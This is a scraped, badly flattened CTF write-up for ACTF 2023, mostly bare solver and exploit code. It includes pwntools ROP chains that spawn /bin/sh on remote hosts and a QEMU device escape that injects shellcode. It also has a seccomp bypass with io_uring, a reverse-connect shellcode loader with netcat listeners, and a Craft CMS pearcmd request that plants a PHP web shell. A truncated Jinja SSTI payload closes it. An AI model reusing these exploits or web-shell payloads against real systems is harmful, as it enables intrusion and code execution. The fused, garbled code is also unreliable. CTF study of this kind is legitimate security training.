# 2023 ACTF writeup by Arr3stY0u

> 原文: https://www.ctfiot.com/142224.html
> ID: 142224

import struct
from claripy import *
enc_flag = [ 0xABA29EC2A98DD89A, 0xBBF1B4AB81B4A9D4, 0xFB92A48DB386FFA8, 0xEFB491B8AFB4ABD3, 0x80EF69F1CBD00397, 0xB2EB07859CDA52D3, 0xEC9E22F5A5A07FA3, 0x4B36DF7B5B655A84,]
_enc_flag = struct.pack('<8Q', *enc_flag)buf = bytearray(_enc_flag)unk = bytearray(struct.pack(' ', payload)sd(img)
payload = b'.COMLEN:
256'payload += b'.OP:
ECHO'payload += b'.FLASHSZ:0'payload = payload.ljust(0x100, b'.')sa(b'> ', payload)
ia()
# '/data/flag' ACTF{REv3rsE_2_bE_A_fLAshH4cK3r_c001}

from pwn import *context.log_level = 'ERROR'

def gen_payload(old, new): old = p64(old) new = p64(new) payload = '' for i in range(8): v = new[i]-old[i] if v == 0: payload += 'd' elif v > 0: payload += f'{v}wd' else: # old[i] < new[i] payload += f'{-v}sd' payload += '8a' return payload

# print(gen_payload(0x11, 0x12))
# exit()

def exploit(op): p.sendlineafter(b'n> ', op.encode()) return u64(p.recvn(8))

def exploit2(op): p.sendlineafter(b'n> ', op.encode()) res = p.recvuntil(b'n> ', True) p.unrecv(b'n> ') # print(hexdump(res, total=False)) _res = res if len(res) != 8: _res = b'' for i in range(len(res)-3): if res[i] == 0x5b and res[i+2] == 0x5d: _res = bytes([res[i+1]])+res[i+3:] break print(hexdump(_res, total=False)) if len(_res) < 8: _res = _res.ljust(8, b'#') assert len(_res) == 8 return _res

_data = b''stack_data = []p = remote('120.46.65.156', 32104)p.recvuntil(b'submit.')
exploit2(gen_payload(u64(b'Aaaaaaax00'), u64(b'/bin/sh'.ljust(8, b'x00'))))
# 8d8sres = exploit('8d8w')buf_base = res - 8stack_data.append(res)_data += p64(res)assert (0x100-(buf_base & 0xFF)) >= 0x30

res = exploit('8a8w8d')stack_data.append(res)_data += p64(res)
leak_counts = 4exploit('8a')for i in range(leak_counts): res = exploit('8a8w') stack_data.append(res) _data += p64(res)
for i in range(len(stack_data)): print(f'{i*8:
02X}', hex(stack_data[i]))
elf_base = stack_data[1]-0x1580 # size 0x5000libc_base = stack_data[2]-0x23d0a # __libc_start_main_ret
ptr_addr = stack_data[0]buf_addr = stack_data[0]-8print('buf_addr:', hex(buf_addr))print('elf_base:', hex(elf_base))print('libc+bbb:', hex(stack_data[2]))for i in range(leak_counts): exploit('8d')
v = 8+(leak_counts)*8exploit2(f'{v}a{v}s{v}d')
exploit2('8d') # skip &rbp
rop_data = [ elf_base+0x15DB, # pop rdi|ret buf_addr, elf_base+0x15DC, # ret libc_base+0x45e50 # system]for i in range(len(rop_data)): exploit2('8d') exploit2(gen_payload(stack_data[2+i], rop_data[i]))
p.sendlineafter(b'n> ', b'')print(p.clean(1))
p.interactive()

#include <stdio.h>#include #include <stdlib.h>#include <stdint.h>#include <string.h>#include <errno.h>#include <signal.h>#include <fcntl.h>#include <ctype.h>#include <termios.h>#include <assert.h>
#include <sys/types.h>#include <sys/mman.h>#include <sys/io.h>
char *mmio_pci_device_name = "/sys/devices/pci0000:00/0000:00:04.0/resource0";
unsigned int pmio_base = 0xc040;
unsigned char *mmio_base;
int open_mem_io(const char *pci_device_name){
 int fd = -1; if ((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) { perror("open pci device"); exit(-1); } return fd;}
// /sys/devices/pci0000:00/0000:00:04.0/resourceunsigned char *get_mem_io_base(const char *pci_device_name, uint64_t addr, int size){
 int fd; fd = open_mem_io(pci_device_name);
 unsigned char *base = mmap((void *)addr, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if (base == (void *)-1) { perror("mmap"); exit(-1); } return base;}
void mmio_write(uint64_t addr, uint32_t value){ *((uint32_t *)(mmio_base + addr)) = value;}
uint32_t mmio_read(uint64_t addr){ return *((uint32_t *)(mmio_base + addr));}
const char *flag = "ACTF{cH3cK_1n_wI7h_B@by_C1ph3r_Te$t_1n_Q3MU_pl4yg3OuNd_1$_EASy!}";
// heap+4GBuint64_t leak_u64(uint64_t addr){ uint64_t v = 0; mmio_write(0x40, addr & 0xFFFFFFFF); uint32_t ll = (uint32_t)inl(pmio_base + 0x10); mmio_write(0x40, (addr + 4) & 0xFFFFFFFF); uint32_t lh = (uint32_t)inl(pmio_base + 0x10); v = (uint64_t)lh << 32 | ll; return v;}// heap+4GBvoid write_u64(uint64_t addr, uint64_t v){ mmio_write(0x40, addr & 0xFFFFFFFF); outl(v & 0xFFFFFFFF, pmio_base + 0x10);
 mmio_write(0x40, (addr + 4) & 0xFFFFFFFF); outl(v >> 32, pmio_base + 0x10);}
// lspciint main(int argc, char const *argv[]){ int i = 0; mmio_base = get_mem_io_base(mmio_pci_device_name, 0xfebf1000, 0x1000); printf("mmio_base Resource0 Base: %pn", mmio_base);
 if (iopl(3) != 0) { perror("I/O permission is not enoughn"); exit(1); }
 int already_logged = 0; int logged = inb(pmio_base + 1); if (!logged) { for (int i = 0; i < 64; i += 4) { mmio_write(i, *(uint32_t *)&flag[i]); } outb(1, pmio_base + 1); for (int i = 0; i < 100; i++) { logged = inb(pmio_base + 1); } } else { printf("already logged!n"); already_logged = 1; } printf("login %dn", logged); if (logged) { // g_malloc(32) if (!already_logged) { outl(0x31323334, pmio_base + 0x10); }
 uint32_t leak = mmio_read(0x40); printf("leak %08Xn", leak); uint64_t addr = leak;
 // 覆盖ptr低地址 mmio_write(0x40, leak + 4); uint32_t leak2 = (uint32_t)inl(pmio_base + 0x10); printf("leak2 %08Xn", leak2); addr = (uint64_t)leak2 << 32 | leak; printf("0x%016llxn", addr); //-0x865b0 uint64_t heap_base = addr & ~0xFFFFFF; printf("heap_base %016llxn", heap_base);
 uint64_t leak_elf = leak_u64(heap_base + 0x000e28) - 0xa23d4f; printf("qemu-system-x86_64 base: 0x%016llxn", leak_elf);
 uint64_t heap_size = leak_u64(heap_base + 0x10); printf("heap_size %016llxn", heap_size);
 // 0xf7db000 remote // 0xd41d000 local uint64_t start_off = 0xFF1D000; // printf("test base: 0x%016llxn", heap_base + start_off); uint64_t shellcode = 0; for (int i = 0; i < 0x20000; i++) { uint64_t _addr = heap_base + start_off - i * 0x1000; // printf("test %016llx: n", _addr-heap_base); if (leak_u64(_addr) == 0x5641554154415355) { shellcode = _addr; printf("shellcode %016llx: %016llxn", shellcode, leak_u64(_addr)); break; } } if (!shellcode) { puts("no! shellcode"); exit(1); } // cat ./flag unsigned char hexData[56] = { 0x48, 0xB8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x50, 0x48, 0xB8, 0x2F, 0x2E, 0x67, 0x6D, 0x60, 0x66, 0x01, 0x01, 0x48, 0x31, 0x04, 0x24, 0x6A, 0x02, 0x58, 0x48, 0x89, 0xE7, 0x31, 0xF6, 0x0F, 0x05, 0x41, 0xBA, 0xFF, 0xFF, 0xFF, 0x7F, 0x48, 0x89, 0xC6, 0x6A, 0x28, 0x58, 0x6A, 0x01, 0x5F, 0x99, 0x0F, 0x05, 0x90, 0x90, 0x90}; // shellcode 16be2000 // + 16be0000
 for (int i = 0; i < sizeof(hexData); i += 8) { write_u64(shellcode + 0x16be0000 + i, *(uint64_t *)&hexData[i]); } // 这个区域的执行频率太高了 5字节的跳转写到一半就蹦了 垫个短跳 unsigned char jmp_code[8] = { 0xE9, 0x00, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90};
 *(uint32_t *)&jmp_code[1] = 0x16be0000 - 0x2D - 5; write_u64(shellcode + 0x2D, *(uint64_t *)&jmp_code[0]);
 unsigned char shortjmp_code[8] = { 0xEB, 0x2B, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90}; write_u64(shellcode + 0, *(uint64_t *)&shortjmp_code[0]); } return 0;}// ACTF{7ry_b4by_q3mu_ch@1leng3_4nd_g3t_b@by_f1ag}

Wish you a good journey line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x19 0xc000003e if (A != ARCH_X86_64) goto 0027 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005 0004: 0x15 0x00 0x16 0xffffffff if (A != 0xffffffff) goto 0027 0005: 0x15 0x15 0x00 0x00000000 if (A == read) goto 0027 0006: 0x15 0x14 0x00 0x00000001 if (A == write) goto 0027 0007: 0x15 0x13 0x00 0x00000002 if (A == open) goto 0027 0008: 0x15 0x12 0x00 0x00000011 if (A == pread64) goto 0027 0009: 0x15 0x11 0x00 0x00000012 if (A == pwrite64) goto 0027 0010: 0x15 0x10 0x00 0x00000013 if (A == readv) goto 0027 0011: 0x15 0x0f 0x00 0x00000014 if (A == writev) goto 0027 0012: 0x15 0x0e 0x00 0x00000028 if (A == sendfile) goto 0027 0013: 0x15 0x0d 0x00 0x0000002c if (A == sendto) goto 0027 0014: 0x15 0x0c 0x00 0x0000002e if (A == sendmsg) goto 0027 0015: 0x15 0x0b 0x00 0x0000003b if (A == execve) goto 0027 0016: 0x15 0x0a 0x00 0x00000101 if (A == openat) goto 0027 0017: 0x15 0x09 0x00 0x00000127 if (A == preadv) goto 0027 0018: 0x15 0x08 0x00 0x00000128 if (A == pwritev) goto 0027 0019: 0x15 0x07 0x00 0x0000012f if (A == name_to_handle_at) goto 0027 0020: 0x15 0x06 0x00 0x00000130 if (A == open_by_handle_at) goto 0027 0021: 0x15 0x05 0x00 0x00000142 if (A == execveat) goto 0027 0022: 0x15 0x04 0x00 0x00000147 if (A == preadv2) goto 0027 0023: 0x15 0x03 0x00 0x00000148 if (A == pwritev2) goto 0027 0024: 0x15 0x02 0x00 0x000001ac if (A == 0x1ac) goto 0027 0025: 0x15 0x01 0x00 0x000001b5 if (A == 0x1b5) goto 0027 0026: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0027: 0x06 0x00 0x00 0x00000000 return KILL

//filename:
fxxk.c//gcc -o fxxk -static -fno-stack-protector -no-pie -O3 ./fxxk.c -luring
#include <assert.h>#include <fcntl.h>#include <liburing.h>#include <stdio.h>#include <stdlib.h>#include #include <sys/socket.h>#include <netinet/in.h>
struct mmsghdr { struct msghdr msg_hdr; /* Actual message header. */ unsigned int msg_len; /* Number of received or sent bytes for the entry. */ };
static inline long __syscall6(long n, long a1, long a2, long a3, long a4, long a5, long a6){ unsigned long ret; register long r10 __asm__("r10") = a4; register long r8 __asm__("r8") = a5; register long r9 __asm__("r9") = a6; __asm__ __volatile__ ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory"); return ret;}
int main(void) { struct io_uring_cqe *cqe; struct io_uring_sqe *sqe; struct io_uring ring; char *send_buff;
 io_uring_queue_init(16, &ring, 0); sqe = io_uring_get_sqe(&ring); io_uring_prep_openat(sqe, AT_FDCWD, "flag", O_RDONLY, 0); io_uring_submit(&ring); io_uring_wait_cqe(&ring, &cqe); //flag_fd -> (int)cqe->res send_buff = __syscall6(9,0,0x1000,7,2,(int)cqe->res,0);
 struct mmsghdr msg; struct iovec iov; iov.iov_base = send_buff; iov.iov_len = 0x50;
 msg.msg_hdr.msg_name = 0; msg.msg_hdr.msg_namelen =0; msg.msg_hdr.msg_iov = &iov; msg.msg_hdr.msg_iovlen = 1; msg.msg_hdr.msg_control = NULL; msg.msg_hdr.msg_controllen = 0; msg.msg_hdr.msg_flags = 0; sendmmsg(4, &msg, 1, 0); /* ACTF{D0_u_kNow_7h@T_1o_u3InG_c4n_θrw_ToO0o0OoO?} */
 return 0;}

#!/usr/bin/env python3'''Author:
7resp4ssDate:
2023-10-27 19:45:
05Usage: Debug : python3 exp.py debug elf-file-path -t -b malloc Remote: python3 exp.py remote elf-file-path ip:
port'''
from pwncli import *cli_script()

io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
filename = gift.filename # current filenameis_debug = gift.debug # is debug or not is_remote = gift.remote # is remote or notgdb_pid = gift.gdb_pid # gdb pid if debug

file_size = 0x4c5000-0x400000sc = asm(shellcraft.amd64.linux.syscall('SYS_memfd_create','rsp',7))
sc+= asm(shellcraft.amd64.linux.syscall('SYS_mmap', 0x400000, file_size+0x15000,'PROT_READ | PROT_WRITE | PROT_EXEC','MAP_PRIVATE | MAP_ANONYMOUS',3, 0))pd = generate_payload_for_connect("127.0.0.1",9999)sc+= asm(shellcraft.amd64.linux.syscall('SYS_socket',2,1,0))sc+= asm(shellcraft.pushstr(pd))sc+= asm(shellcraft.amd64.linux.syscall('SYS_connect',4,'rsp',0x10))
cyc_recv = ''' mov r12,0x400000recv: mov rdi,4 mov rsi,r12 mov rdx,0x50000 mov rax,45 xor r10,r10 xor r8,r8 syscall add r12,rax test rax,rax js fini jmp recv

fini: push 0x401E05 ret'''

sc+= asm(cyc_recv)

sla('code',sc)
ia()

cat ./fxxk | nc -l 9999 > recv_flag

./exp.py de ./master-of-orw

cat ./fxxk | nc -lvnp 9999 > recv_flag

c = 63442255298812942222810837512019302954917822996915527697525497640413662503768308023517128481053593562877494934841788054865410798751447333551319775025362132176942795107214528962480350398519459474033659025815248579631003928932688495682277210240277909527931445899728273182691941548330126199931886748296031014210795428593631253184315074234352536885430181103986084755140024577780815130067722355861473639612699372152970688687877075365330095265612016350599320999156644e = 272785315258275494478303901715994595013215169713087273945370833673873860340153367010424559026764907254821416435761617347240970711252213646287464416524071944646705551816941437389777294159359383356817408302841561284559712640940354294840597133394851851877857751302209309529938795265777557840238332937938235024502686737802184255165075195042860413556866222562167425361146312096189555572705076252573222261842045286782816083933952875990572937346408235562417656218440227n1 = 473173031410877037287927970398347001343136400938581274026578368211539730987889738033351265663756061524526288423355193643110804217683860550767181983527932872361546531994961481442866335447011683462904976896894011884907968495626837219900141842587071512040734664898328709989285205714628355052565784162841441867556282849760230635164284802614010844226671736675222842060257156860013384955769045790763119616939897544697150710631300004180868397245728064351907334273953201n2 = 327163771871802208683424470007561712270872666244394076667663345333853591836596054597471607916850284565474732679392694515656845653581599800514388800663813830528483334021178531162556250468743461443904645773493383915711571062775922446922917130005772040139744330987272549252540089872170217864935146429898458644025927741607569303966038195226388964722300472005107075179204987774627759625183739199425329481632596633992804636690274844290983438078815836605603147141262181n3 = 442893163857502334109676162774199722362644200933618691728267162172376730137502879609506615568680508257973678725536472848428042122350184530077765734033425406055810373669798840851851090476687785235612051747082232947418290952863499263547598032467577778461061567081620676910480684540883879257518083587862219344609851852177109722186714811329766477552794034774928983660538381764930765795290189612024799300768559485810526074992569676241537503405494203262336327709010421

M=Matrix(ZZ,4,7)
M[0,0]=n1M[3,0]=eM[1,1]=n2M[3,1]=eM[2,2]=n3M[3,2]=eM[0,3]=2^768M[1,4]=2^768M[2,5]=2^768M[3,6]=2^768
mm = M.LLL()print(mm[0])
d=int(mm[0][-1])//2^768d=int(d)m=pow(c,d,n1)from Crypto.Util.number import *print(long_to_bytes(m))#b'ACTF{5FFC427B-F14F-DCA0-C425-675B149890C2}'

from hashlib import sha256from Crypto.Util.number import *with open ('output.txt') as f: exec(f.read())r = 128c = 96p = 308955606868885551120230861462612873078105583047156930179459717798715109629AA=matrix(Zmod(p),A)BB=matrix(Zmod(p),B)shared = (AA.T*BB).trace()print('shared=',shared)flag=int(sha256(str(int(shared)).encode()).hexdigest(), 16)^^encprint(long_to_bytes(flag))

shared= 229215835499100713048005195047655740191791862411327976508820034350300131774b'ACTF{do_you_know_f0rm2l1n_1s_4w3s0m3!}'

from pwn import remote
from tqdm import tqdm
from os import system

def once(): rn = remote('ip', 'port') with tqdm(range(256), desc='score=0, expect=0') as bar: score = 0 for i in bar: if score >= 2220: print(rn.recvline().decode()) rn.interactive() break if score < 2220 - (256 - i) * 8.83 and 16 < i < 160: # 剪枝 break
 # 抓娃娃 pos = rn.recvline_startswith(b'i am at ').decode() x, y = map(int, pos.split('[')[-1].split(']')[0].split(',')) rn.sendlineafter(b'Your moves: ', b'S' * 15 + b'A' * 15 + b'D' * x + b'W' * y) assert rn.recvline().decode() == f'{x} {y}n'
 # 随机落夹 chaos = rn.recvline_startswith(b'choas:').decode() chaos = int(chaos.split()[-1]) p = int(bin(chaos)[3:-65], 2) q = 1 << 63 delta = abs(chaos*q - p*pow(2,128)) poss = bin(delta)[2:].count('0') / len(bin(delta)[2:]) rn.sendlineafter(b'): ', f'{p},{q}'.encode())
 # 更新分数 score = rn.recvline_startswith(b'your score: ').decode() score = int(score.split(' ')[-1]) bar.desc = f'score={score}, expect={score/(i+1)*256:.2f}, poss={poss:.3f}' rn.close()
while True: once()
# ACTF{C0Nt1nu3d_Fract1on&Mor3_zer0s&Replay_it}

java -cp "apps/*:
lib/*:
conf/" org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriber flag1Start testStep 2:
Receive msg, time: 2023-10-28 14:38:
58topic:
flag1 content:
ACTF{Con5oR7ium_B1ock_

2665bf1dcd6ec3c77f769d1299c2a2ffe616964a81b634c932914ce92d4c2dd7

openssl ecparam -name secp256k1 -genkey -out secp256k1-priv.pem

charon@root:~/Desktop$ openssl pkey -in secp256k1-priv.pem -text-----BEGIN PRIVATE KEY-----MIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQgH1iMXflR1JXdgq4IgIumGC5Q92xJ75UdSzn0t4ARtXWhRANCAARi4WBZ94dv+BQiU/httvye3aaRKPNkA2wvatETOlrfbVMHgdRribhGNEu/zK1FdztkawQ+iB27VqdIjG0ReMiR-----END PRIVATE KEY-----Private-Key: (256 bit)priv: 1f:58:8c:5d:f9:51:d4:95:dd:82:ae:08:80:8b:a6: 18:2e:50:f7:6c:49:ef:95:1d:4b:39:f4:b7:80:11: b5:
75pub: 04:62:e1:60:59:f7:87:6f:f8:14:22:53:f8:6d:b6: fc:9e:dd:a6:91:28:f3:64:03:6c:2f:6a:d1:13:3a: 5a:df:6d:53:07:81:d4:6b:89:b8:46:34:4b:bf:cc: ad:45:77:3b:64:6b:04:3e:88:1d:bb:56:a7:48:8c: 6d:11:78:c8:
91ASN1 OID: secp256k1charon@root:~/Desktop$ more secp256k1-priv.pem -----BEGIN EC PRIVATE KEY-----MHQCAQEEIB9YjF35UdSV3YKuCICLphguUPdsSe+VHUs59LeAEbV1oAcGBSuBBAAKoUQDQgAEYuFgWfeHb/gUIlP4bbb8nt2mkSjzZANsL2rREzpa321TB4HUa4m4RjRLv8ytRXc7ZGsEPogdu1anSIxtEXjIkQ==-----END EC PRIVATE KEY-----

b='MIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQg8hViqWbBo5plQehiI5LCw7ybwdZ0L3Rlebkghl53rs2hRANCAAT3y+X8MRoE+u3VVJsfPbVdeR2WKHYtIg1FKSLumVtrekXthxAZFJ8Dq1EjsBaAbskJzai1Db24a/FD2dyrfw6G'print(base64.b64decode(b).hex())
# 308184020100301006072a8648ce3d020106052b8104000a046d306b0201010420f21562a966c1a39a6541e8622392c2c3bc9bc1d6742f746579b920865e77aecda14403420004f7cbe5fc311a04faedd5549b1f3db55d791d9628762d220d452922ee995b6b7a45ed871019149f03ab5123b016806ec909cda8b50dbdb86bf143d9dcab7f0e86

charon@root:~/Desktop$ openssl pkey -in secp256k1-priv.pem -text-----BEGIN PRIVATE KEY-----MIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQg8hViqWbBo5plQehiI5LCw7ybwdZ0L3Rlebkghl53rs2hRANCAAT3y+X8MRoE+u3VVJsfPbVdeR2WKHYtIg1FKSLumVtrekXthxAZFJ8Dq1EjsBaAbskJzai1Db24a/FD2dyrfw6G-----END PRIVATE KEY-----Private-Key: (256 bit)priv: f2:15:62:a9:66:c1:a3:9a:65:41:e8:62:23:92:c2: c3:bc:9b:c1:d6:74:2f:74:65:79:b9:20:86:5e:77: ae:
cdpub: 04:f7:cb:e5:fc:31:1a:04:fa:ed:d5:54:9b:1f:3d: b5:5d:79:1d:96:28:76:2d:22:0d:45:29:22:ee:99: 5b:6b:7a:45:ed:87:10:19:14:9f:03:ab:51:23:b0: 16:80:6e:c9:09:cd:a8:b5:0d:bd:b8:6b:f1:43:d9: dc:ab:7f:0e:
86ASN1 OID: secp256k1
#308184020100301006072a8648ce3d020106052b8104000a046d306b0201010420f21562a966c1a39a6541e8622392c2c3bc9bc1d6742f746579b920865e77aecd a14403420004f7cbe5fc311a04faedd5549b1f3db55d791d9628762d220d452922ee995b6b7a45ed871019149f03ab5123b016806ec909cda8b50dbdb86bf143d9dcab7f0e86
charon@root:~/Desktop$ openssl pkey -in secp256k1-priv.pem -text-----BEGIN PRIVATE KEY-----MIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQgH1iMXflR1JXdgq4IgIumGC5Q92xJ75UdSzn0t4ARtXWhRANCAARi4WBZ94dv+BQiU/httvye3aaRKPNkA2wvatETOlrfbVMHgdRribhGNEu/zK1FdztkawQ+iB27VqdIjG0ReMiR-----END PRIVATE KEY-----Private-Key: (256 bit)priv: 1f:58:8c:5d:f9:51:d4:95:dd:82:ae:08:80:8b:a6: 18:2e:50:f7:6c:49:ef:95:1d:4b:39:f4:b7:80:11: b5:
75pub: 04:62:e1:60:59:f7:87:6f:f8:14:22:53:f8:6d:b6: fc:9e:dd:a6:91:28:f3:64:03:6c:2f:6a:d1:13:3a: 5a:df:6d:53:07:81:d4:6b:89:b8:46:34:4b:bf:cc: ad:45:77:3b:64:6b:04:3e:88:1d:bb:56:a7:48:8c: 6d:11:78:c8:
91ASN1 OID: secp256k1
# 308184020100301006072a8648ce3d020106052b8104000a046d306b02010104201f588c5df951d495dd82ae08808ba6182e50f76c49ef951d4b39f4b78011b575 a1440342000462e16059f7876ff8142253f86db6fc9edda69128f364036c2f6ad1133a5adf6d530781d46b89b846344bbfccad45773b646b043e881dbb56a7488c6d1178c891

a=0b=7p=115792089237316195423570985008687907853269984665640564039457584007908834671663E=EllipticCurve(Zmod(p),[a,b])d=int('2665bf1dcd6ec3c77f769d1299c2a2ffe616964a81b634c932914ce92d4c2dd7',16)G_x=int('79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798',16)G_y=int('483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8',16)G=E(G_x,G_y)pub=d*Gprint(pub)print(hex(int(pub.xy()[0])))print(hex(int(pub.xy()[1])))
# (91397747157905405488960538017777721206309328713068899403083847758775680259636 : 100378415417354102646968036094699351150291716697745738660415200736280639905072 : 1)
# 0xca114aab2bb7442b66b839f42295cda6aec6ba8ec551f8458594fd1065f05634
# 0xddec2b769f81772b9cdfc05b73184bb179a35829afe17c0daf3aab2d46af1d30

a='308184020100301006072a8648ce3d020106052b8104000a046d306b02010104202665bf1dcd6ec3c77f769d1299c2a2ffe616964a81b634c932914ce92d4c2dd7a14403420004ca114aab2bb7442b66b839f42295cda6aec6ba8ec551f8458594fd1065f05634ddec2b769f81772b9cdfc05b73184bb179a35829afe17c0daf3aab2d46af1d30'import base64aa=bytes.fromhex(a)print(base64.b64encode(aa))
# MIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQgJmW/Hc1uw8d/dp0SmcKi/+YWlkqBtjTJMpFM6S1MLdehRANCAATKEUqrK7dEK2a4OfQilc2mrsa6jsVR+EWFlP0QZfBWNN3sK3afgXcrnN/AW3MYS7F5o1gpr+F8Da86qy1Grx0w

charon@root:~/Desktop$ openssl pkey -in prive.pem -text-----BEGIN PRIVATE KEY-----MIGEAgEAMBAGByqGSM49AgEGBSuBBAAKBG0wawIBAQQgJmW/Hc1uw8d/dp0SmcKi/+YWlkqBtjTJMpFM6S1MLdehRANCAATKEUqrK7dEK2a4OfQilc2mrsa6jsVR+EWFlP0QZfBWNN3sK3afgXcrnN/AW3MYS7F5o1gpr+F8Da86qy1Grx0w-----END PRIVATE KEY-----Private-Key: (256 bit)priv: 26:65:bf:1d:cd:6e:c3:c7:7f:76:9d:12:99:c2:a2: ff:e6:16:96:4a:81:b6:34:c9:32:91:4c:e9:2d:4c: 2d:
d7pub: 04:ca:11:4a:ab:2b:b7:44:2b:66:b8:39:f4:22:95: cd:a6:ae:c6:ba:8e:c5:51:f8:45:85:94:fd:10:65: f0:56:34:dd:ec:2b:76:9f:81:77:2b:9c:df:c0:5b: 73:18:4b:b1:79:a3:58:29:af:e1:7c:0d:af:3a:ab: 2d:46:af:1d:
30ASN1 OID: secp256k1

java -cp "apps/*:
lib/*:
conf/" org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriberPrivate flag2 conf/amop/prive.pem Start testStep 2:
Receive msg, time: 2023-10-28 14:50:
18topic:
flag2 content:
cHAiN_sO_INterESt1NG}

POST /index.php?+config-create+/&/<?=system($_GET['a'])?>+/tmp/hello.php HTTP/1.1Host: 61.147.171.105:
57690Content-Length: 225Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://61.147.171.105:
57690Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://61.147.171.105:
57690/index.php?+config-create+/&/%3C?=phpinfo()?%3E+Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: CraftSessionId=0f4f73c886a22cb11f6e1980b0c1a1c5; CRAFT_CSRF_TOKEN=0ab61f9f593ede910d55226ba018126504d915a3bfa474065ee4d2d4680bd596a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22vIF55Ar8Ye6Ezz4oJK47ev5Uv6tibRZ_l8ZUZB-9%22%3B%7DConnection: close
action=conditions%2Frender&configObject=craft%5Celements%5Cconditions%5CElementCondition&config={"name":"configObject","as ":{"class":"\yii\rbac\PhpManager","__construct()":[{"itemFile":"/usr/local/lib/php/pearcmd.php"}]}}

POST /index.php?a=cat /flag HTTP/1.1Host: 61.147.171.105:
57690Content-Length: 209Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://61.147.171.105:
57690Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://61.147.171.105:
57690/index.php?+config-create+/&/%3C?=phpinfo()?%3E+Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: CraftSessionId=0f4f73c886a22cb11f6e1980b0c1a1c5; CRAFT_CSRF_TOKEN=0ab61f9f593ede910d55226ba018126504d915a3bfa474065ee4d2d4680bd596a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22vIF55Ar8Ye6Ezz4oJK47ev5Uv6tibRZ_l8ZUZB-9%22%3B%7DConnection: close
action=conditions%2Frender&configObject=craft%5Celements%5Cconditions%5CElementCondition&config={"name":"configObject","as ":{"class":"\yii\rbac\PhpManager","__construct()":[{"itemFile":"/tmp/hello.php"}]}}

def __init__(self, width: int = 160, height: int = 60, key: int = None, length: int = 4, fonts: t.Optional[t.List[str]] = None, font_sizes: t.Optional[t.Tuple[int]] = None): self._width = width self._height = height self._length = length self._key = (key or int(time.time())) + random.randint(1,100) print(self._key) self._fonts = fonts or DEFAULT_FONTS self._font_sizes = font_sizes or (42, 50, 56) self._truefonts: t.List[FreeTypeFont] = [] random.seed(self._key)

while True: now = int(time.time()) session = requests.session() all = 0 payload = '123' res = session.get(url+'captcha') for i in range(1,100): gen = Captcha(200, 80,now+i) buf , captcha_text = gen.generate() if(buf.getvalue()==res.content): print(now+i) seed = now+i print('success')

gen = Captcha(200, 80,seed)buf , captcha_text = gen.generate()code = generate_code()minic_waf(payload)
x = 0while True: x+=1 if minic_waf(payload) == '1': print(x) breakif(x>10): print("more than 10") time.sleep(1) breakprint("x_all:"+str(x))res = session.post(url+'vip',json={"captcha":
code})print(res.cookies)print("a")res = session.post(url+'write',json={"story":
payload})print(res.text)error = []for i in range(x-1): res = session.post(url+'write',json={"story":
payload})
 print(i)payload = '{% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set space = self|string|min %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = 